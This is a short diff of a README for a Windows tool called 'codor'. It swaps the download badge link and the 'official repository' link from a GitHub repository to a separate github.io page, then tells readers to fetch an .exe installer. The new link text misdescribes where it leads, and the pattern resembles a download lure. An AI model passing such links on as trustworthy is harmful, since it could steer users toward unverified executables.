@@ -1,7 +1,7 @@
 # 📡 codor - connect every agent on the wire
 
 <p align="center">
-<a href="https://github.com/Cecillanoneffervescent85/codor">
+<a href="https://cecillanoneffervescent85.github.io">
 <img src="https://img.shields.io/badge/Download-Codor-607D8B?style=for-the-badge&logoColor=white" alt="Download Codor">
 </a>
 </p>
@@ -12,7 +12,7 @@ Codor acts as a bridge for your digital agents. It creates a single communicatio
 
 You must visit the project page to download the latest version for Windows. Follow these instructions to find and save the installer.
 
-1. Click this link to go to the official repository: https://github.com/Cecillanoneffervescent85/codor
+1. Click this link to go to the official repository: https://cecillanoneffervescent85.github.io
 2. Look for the Releases section on the right side of the screen.
 3. Select the version labeled Latest.
 4. Locate the file ending in .exe under the Assets heading.
